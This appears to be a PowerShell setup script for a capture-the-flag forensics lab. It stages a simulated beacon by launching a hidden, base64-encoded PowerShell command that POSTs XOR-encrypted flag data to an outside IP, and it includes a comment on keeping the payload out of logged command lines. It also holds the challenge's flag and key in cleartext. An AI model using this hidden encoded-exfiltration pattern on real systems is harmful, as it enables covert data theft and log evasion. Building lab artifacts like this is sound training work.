# Beacon exec, run as chrisRK. Launches a base64-encoded ("-enc") PowerShell
# command, captured as Sysmon Event 1 (and visible in PowerShell-Operational).
#
# Options-1+3 rework: the decoded payload no longer contains the flag in
# cleartext. The flag is XOR-encrypted with $key and only the base64 ciphertext
# is posted. Recovering the flag requires correlating the KEY carried by the
# persistence value (Sysmon Event 13 - see set_persistence_offline.ps1). $key
# MUST stay identical between the two scripts.
#
# As before: encode only the bare script body, never a full
# `powershell.exe -Command "..."` wrapper, or -EncodedCommand decodes into a
# second real powershell invocation that would log the payload in its own
# CommandLine.
$flag = 'flag{gr0und_c0ntr0l_t0_m4j0r_1ntrus10n}'
$key  = 'H0UST0N_TR4NQU1L1TY_B4S3'

$fb = [System.Text.Encoding]::ASCII.GetBytes($flag)
$kb = [System.Text.Encoding]::ASCII.GetBytes($key)
$ct = New-Object byte[] $fb.Length
for ($i = 0; $i -lt $fb.Length; $i++) { $ct[$i] = $fb[$i] -bxor $kb[$i % $kb.Length] }
$c = [Convert]::ToBase64String($ct)

$decoded = "`$c='$c'; iwr -Uri http://198.51.100.23/beacon -Method POST -Body `$c"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($decoded)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host "Encoded command:"
Write-Host "powershell.exe -enc $encoded"

Start-Process -FilePath "powershell.exe" -ArgumentList "-nop -w hidden -enc $encoded" -WindowStyle Hidden
Start-Sleep -Seconds 2
Write-Host "Launched."
